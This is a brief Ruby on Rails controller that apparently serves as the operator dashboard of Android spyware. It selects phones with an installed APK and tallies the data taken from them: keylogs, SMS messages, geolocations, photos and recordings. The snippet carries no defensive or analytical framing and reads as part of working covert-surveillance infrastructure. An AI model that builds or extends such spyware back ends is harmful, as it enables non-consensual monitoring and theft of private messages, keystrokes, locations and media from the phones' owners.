class DashboardsController < ActionController::Base
  def index
    @devices = Smartphone.joins(:apk_installation).where("apk_installations.status = 'installed'")
    @stats = {
      devices: @devices.count,
      keylogs: Keylog.count,
      sms: SmsMessage.count,
      locations: GeoLocation.count,
      photos: Picture.count,
      recordings: Recording.count
    }
    render layout: false
  end
end
